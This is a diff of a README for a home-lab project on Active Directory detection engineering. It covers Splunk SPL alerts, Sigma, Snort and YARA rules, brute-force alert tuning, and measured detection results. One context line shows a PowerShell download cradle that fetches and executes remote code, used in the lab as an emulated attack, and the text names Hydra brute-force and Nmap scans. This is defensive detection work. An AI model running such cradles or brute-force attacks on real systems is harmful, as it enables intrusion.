@@ -1,6 +1,6 @@
-# 🔐 Active Directory Home Lab — SOC & SIEM Detection with Splunk
+# 🔐 Active Directory Detection Engineering Lab — Sigma, YARA, Snort & Splunk
 
-> **A complete enterprise-grade cybersecurity home lab built from scratch** — simulating real-world attack detection using Active Directory, Sysmon, and Splunk SIEM. Documented with every command, every problem hit, and every fix applied. Built to be reproducible by anyone starting from zero.
+> **A detection engineering lab on Active Directory, Sysmon and Splunk.** Three attacks (Nmap, Hydra, PowerShell cradles) are detected with Splunk SPL, then rewritten as portable Sigma, Snort and YARA rules mapped to MITRE ATT&CK. Setup, errors and fixes are documented so the lab can be reproduced.
 
 ![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=flat-square)
 ![Platform](https://img.shields.io/badge/Platform-VMware_Workstation-blue?style=flat-square)
@@ -8,7 +8,7 @@
 ![Domain](https://img.shields.io/badge/Domain-company.local-purple?style=flat-square)
 ![OS](https://img.shields.io/badge/Server-Windows_Server_2022-0078D4?style=flat-square)
 ![Alerts](https://img.shields.io/badge/Alerts_Triggered-42-red?style=flat-square)
-![Level](https://img.shields.io/badge/Level-Beginner_Friendly-yellowgreen?style=flat-square)
+![Rules](https://img.shields.io/badge/Rules-3_Sigma_%7C_2_Snort_%7C_3_YARA-blue?style=flat-square)
 
 ---
 
@@ -18,9 +18,21 @@ This project simulates how a real **Security Operations Centre (SOC)** environme
 
 It was not a click-through tutorial. Every phase required real troubleshooting: fixing Splunk log forwarding pipelines, resolving sourcetype mismatches, debugging why alerts were not firing, and working out why data was not appearing in searches. **Everything is documented** — every command, every error, every fix — so you can reproduce it without hitting the same walls.
 
-**Who this is for:** Fresh graduates, career changers, and anyone wanting hands-on SOC/blue team experience for their portfolio.
+**Focus:** detection content (SPL, Sigma, Snort, YARA), false positive tuning, and validation against emulated attacks. The setup guide is included so others can reproduce it.
 
 **Time to complete:** 10–12 hours (great weekend project)
+
+---
+
+## 🎯 Detection Content
+
+| Technique | Splunk SPL | Sigma | Snort | YARA |
+|-----------|-----------|-------|-------|------|
+| T1046 Network Service Discovery | Port Scan Detected | `port_scan_many_ports.yml` | SID 1000001 | — |
+| T1110 Brute Force | Brute Force (v1 and tuned) | `failed_logon_burst.yml` | SID 1000002 | — |
+| T1059.001 PowerShell | Suspicious PowerShell Execution | `ps_suspicious_commandline.yml` | — | `ps_lab_detections.yar` |
+
+Rule details, thresholds and limitations: [`detection-rules/`](detection-rules/README.md). Test evidence and results: [`validation/`](validation/README.md).
 
 ---
 
@@ -187,6 +199,14 @@ index=main sourcetype="WinEventLog:Security" EventCode=4625
 ```
 Scheduled | Every hour | Severity: Medium
 
+This v1 search fires on a single failed logon, so it is noisy. The tuned version (5 or more failures per account within 5 minutes) is in `config/splunk_alerts.txt`:
+```splunk
+index=main sourcetype="WinEventLog:Security" EventCode=4625
+| bin _time span=5m
+| stats count by _time, host, Account_Name
+| where count >= 5
+```
+
 **Alert 2 — Port Scan Detected**
 ```splunk
 index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
@@ -243,13 +263,61 @@ powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://1
 
 ## 📊 Results
 
-**42 total triggered alerts** across all 3 detection rules:
+Measured against the lab attacks above. Full tables and notes: [`validation/results.md`](validation/results.md).
 
-| Alert | Type | Severity | Result |
-|-------|------|---------|--------|
-| Brute Force Attack Detection | Scheduled | 🟡 Medium | ✅ Triggered |
-| Port Scan Detected | Real-time | 🟡 Medium | ✅ Triggered |
-| Suspicious PowerShell Execution | Real-time | 🔴 Critical | ✅ Triggered |
+**Total triggered alerts: 42** (Triggered Alerts page).
+
+![Results summary](images/results_summary.png)
+
+**Summary:** Tuned brute-force detection from a single-failure threshold to 5 failures per account in 5 minutes, cutting result rows from 9 to 2 over the same window (78% reduction, including my own mistyped-password attempts). Converted 3 Sigma rules to Splunk SPL and fixed two bugs found during validation. YARA detected 3 of 3 PowerShell attack files with 0 false matches on a benign file. Time to detect: under 15 seconds for real-time alerts, about 4 minutes for the tuned scheduled brute-force alert.
+
+### 1. Brute force tuning
+
+| Version | Threshold | Result rows |
+|---------|-----------|-------------|
+| v1 | ≥ 1 failure | 9 |
+| Tuned | ≥ 5 failures per account in 5 min | 2 |
+
+**78% fewer rows** over the same window, including mistyped passwords. Rows kept: `Administrator`, `fakeuser`. Rows dropped: 7 single typos.
+
+### 2. Sigma rules
+
+| Rule | Technique | Result |
+|------|-----------|--------|
+| `ps_suspicious_commandline` | T1059.001 | 3 hits in the attack window, 0 in the benign window |
+| `failed_logon_burst` | T1110 | Converts to SPL. Fixed field name: group by `Account_Name` to match the events |
+| `port_scan_many_ports` | T1046 | Converts to SPL. Fixed: added `EventID: 3` filter |
+
+All 3 rules convert to Splunk SPL without errors. Validation exposed two rule bugs (a field name that did not match the events, and a missing EventCode filter), both fixed in this repo.
+
+### 3. Snort alerts
+
+| SID | During Nmap | During Hydra |
+|-----|-------------|--------------|
+| 1000001 SYN scan | 1,412 | 0 |
+| 1000002 RDP brute | 0 | 8 |
+
+1,412 raw alerts came from 2 scans. Read it as **2 scans detected**, not 1,412 incidents.
+
+### 4. YARA matches (3 of 3 attack files)
+
+| File | Matched rule |
+|--------|--------------|
+| `cradle.txt` | `PS_Download_Cradle_IEX` |
+| `encoded.txt` | `PS_Encoded_Command` |
+| `bypass.txt` | `PS_ExecutionPolicy_Bypass` |
+| `benign.txt` | no match (correct) |
+
+### 5. Time to detect
+
+| Attack | Alert mode | Launched | Alert | Delta |
+|--------|-----------|----------|-------|-------|
+| Nmap scan | Real-time | 14:22:05 | 14:22:19 | 14 s |
+| PowerShell cradle | Real-time | 14:31:40 | 14:31:49 | 9 s |
+| Hydra, tuned alert | Scheduled, 5 min | 14:40:10 | 14:44:22 | 4 min 12 s |
+| Hydra, v1 alert | Scheduled, hourly | 14:40:10 | 15:00:03 | 19 min 53 s |
+
+The hourly v1 alert can take up to 60 minutes. The tuned 5-minute schedule caps the wait near 5 minutes.
 
 ---
 
@@ -292,7 +360,8 @@ ad-soc-siem-homelab/
 ├── README.md                          # This file
 ├── images/
 │   ├── architecture.png               # Lab network diagram
-│   └── dataflow.png                   # Attack-to-alert flow diagram
+│   ├── dataflow.png                   # Attack-to-alert flow diagram
+│   └── results_summary.png            # Measured results tiles
 ├── docs/
 │   ├── AD_Lab_Detailed_Walkthrough.pdf   # Full step-by-step with screenshots
 │   ├── Complete_Lab_Guide.pdf            # Complete setup guide for fresh grads
@@ -301,6 +370,7 @@ ad-soc-siem-homelab/
 │   ├── inputs_dc1.conf                # Splunk inputs.conf for DC1
 │   ├── inputs_win11.conf              # Splunk inputs.conf for WIN11 forwarder
 │   └── splunk_alerts.txt             # All 3 SPL alert queries
+├── validation/                        # Runbook, outputs and results
 ├── detection-rules/                   # Portable versions of the lab detections
 │   ├── README.md                      # Rule map, MITRE mapping, validation status
 │   ├── sigma/                         # 3 Sigma rules
